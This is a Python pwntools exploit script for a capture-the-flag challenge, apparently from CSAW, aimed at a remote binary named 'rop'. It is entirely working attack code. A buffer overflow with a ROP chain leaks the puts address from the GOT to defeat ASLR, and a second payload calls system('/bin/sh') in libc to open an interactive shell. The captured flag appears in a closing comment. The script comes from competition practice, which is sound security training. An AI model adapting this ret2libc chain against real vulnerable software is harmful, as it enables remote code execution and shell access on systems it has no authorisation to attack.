from pwn import *
import time


binpath = './rop'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'


# io = process(binpath)
io = remote('pwn.chal.csaw.io', 5016)
gdbscript = '''
gef'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)

io.recvuntil(b'Hello\n')
time.sleep(0.1)


addr_pop_rdi = 0x0000000000400683
addr_ret = 0x000000000040048e

payload = b''
payload += b'A' * 0x20
payload += p64(0xdeadbeefcafebabe)
payload += p64(addr_pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

io.sendline(payload)

addr_libc = u64(io.recvline().rstrip().ljust(8, b'\x00')) - libc.symbols['puts']
print('addr_libc = 0x{:x}'.format(addr_libc))

io.recvuntil(b'Hello\n')
time.sleep(0.1)

payload = b''
payload += b'B' * 0x20
payload += p64(0xdeadbeefcafebabe)
payload += p64(addr_ret)
payload += p64(addr_pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh\x00')))
payload += p64(addr_libc + libc.symbols['system'])

io.sendline(payload)


io.interactive()


# flag{r0p_4ft3r_r0p_4ft3R_r0p}
